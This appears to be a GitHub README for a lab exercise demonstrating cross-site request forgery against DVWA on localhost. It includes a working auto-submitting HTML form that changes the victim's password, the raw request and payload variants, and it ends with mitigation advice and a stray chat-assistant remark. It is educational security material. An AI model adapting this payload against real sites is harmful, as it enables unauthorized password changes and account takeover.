# CSRF Attack Demonstration using DVWA

## What is CSRF?
Cross-Site Request Forgery (CSRF) is a type of attack that tricks a victim into submitting malicious requests unknowingly. These requests use the victim's session credentials, such as cookies, to perform unauthorized actions on a trusted web application.

CSRF typically targets state-changing requests, not data theft. With a successful CSRF attack, the attacker can:
- Change passwords
- Transfer funds
- Modify user data

## How Does CSRF Work?
- The user logs into a vulnerable web application.
- A session is created and a token is stored in the browser cookies.
- The attacker sends a crafted URL or HTML page with an auto-submitting form.
- If the user is logged in, the browser sends the cookies with the request.
- The server performs the action without verifying the source of the request.

## Attack Flow:
1. *User logs in* and receives a session token (stored in cookies).
2. *Attacker creates a CSRF payload* (malicious HTML or script).
3. *Victim visits* the attacker's page while logged into the vulnerable app.
4. *Form auto-submits* and executes the action on the server.
5. *Server processes* the request as if it came from the legitimate user.

## Tools Used:
- *DVWA (Damn Vulnerable Web Application)*
- *XAMPP or Kali Linux*
- *Browser* (Chrome, Firefox, etc.)
- *Mousepad or any text editor*

## Setting Up DVWA:
1. Install *XAMPP* (or use *Kali Linux* which may already have DVWA).
2. Place DVWA folder in /opt/lampp/htdocs or htdocs in XAMPP directory.
3. Start Apache and MySQL servers from XAMPP control panel.
4. Go to http://127.0.0.1/dvwa/setup.php and click *Create/Reset Database*.
5. Login at http://127.0.0.1/dvwa/login.php with:
   - Username: admin
   - Password: password
6. Set *DVWA Security Level* to Low from the Security tab.

## Target Page:
- Navigate to: http://127.0.0.1/vulnerabilities/csrf/
- This page allows password change without any CSRF protection.

## CSRF Exploit HTML Code:
Create a file named csrf.htm with the following content:

html
<!DOCTYPE html>
<html>
<head><title>CSRF Attack</title></head>
<body>
    <form id="csrf" action="http://127.0.0.1/vulnerabilities/csrf/" method="GET">
        <input type="hidden" name="password_new" value="123123">
        <input type="hidden" name="password_conf" value="123123">
        <input type="hidden" name="Change" value="Change">
    </form>
    <script>
        document.getElementById('csrf').submit();
    </script>
</body>
</html>


## How to Execute:
1. Open DVWA and log in.
2. Open csrf.htm using your browser.
3. If logged in, the password will automatically be changed to 123123.

## HTTP Request Details:

GET /vulnerabilities/csrf/?password_new=123123&password_conf=123123&Change=Change HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=<session-id>

- Response: HTTP/1.1 200 OK confirms password change

## Why the Attack Works:
- No CSRF token verification
- No Origin or Referer header checks
- Cookies are sent automatically by the browser

## Variants of CSRF Payloads:
- Using <img src="URL"> or <iframe> for GET requests
- JavaScript with fetch() or XMLHttpRequest (if CORS misconfigured)

## Mitigation Techniques:
1. *CSRF Tokens*: Add a unique, unpredictable token for each form.
2. *SameSite Cookies*: Set SameSite=Lax or Strict on session cookies.
3. *Referer/Origin Validation*: Check the headers for valid sources.
4. *User Re-authentication*: Ask for password confirmation on critical actions.
5. *CAPTCHAs*: Add friction to requests to prevent automation.

## Real-World Examples:
- CSRF vulnerabilities found in WordPress plugins, banking apps, admin panels
- GitHub and Google use double-submit or token-based CSRF protection

## Common Mistakes Leading to CSRF:
- Not using tokens in state-changing requests
- Using GET requests for sensitive operations
- Storing sessions without validating origin headers

## Notes:
- *CSRF only works if the user is authenticated*
- *Does not apply to logout unless session is invalidated properly*
- *Best practices recommend always using POST with CSRF tokens*

## Screenshots 
- DVWA interface
  
 ![WhatsApp Image 2025-04-22 at 00 58 22_433114d2](https://github.com/user-attachments/assets/131fb6f2-4e58-4707-a778-ff5582b8563b)

- HTML file
  
 ![image](https://github.com/user-attachments/assets/424209df-3d6f-4f49-934a-0a6b4f146ac8)

- Console network tab showing GET request

## Author:
Your Name  Divyanshu
[LinkedIn](https://www.linkedin.com/in/divyanshu-maurya-b5278b309/)


## License:
MIT License

> This project is created for educational purposes only. Do not attempt to exploit real websites without permission.


I've updated the README with your LinkedIn profile link: linkedin.com/in/divy1436. Let me know if you'd like to add your GitHub, email, or any project screenshots next!
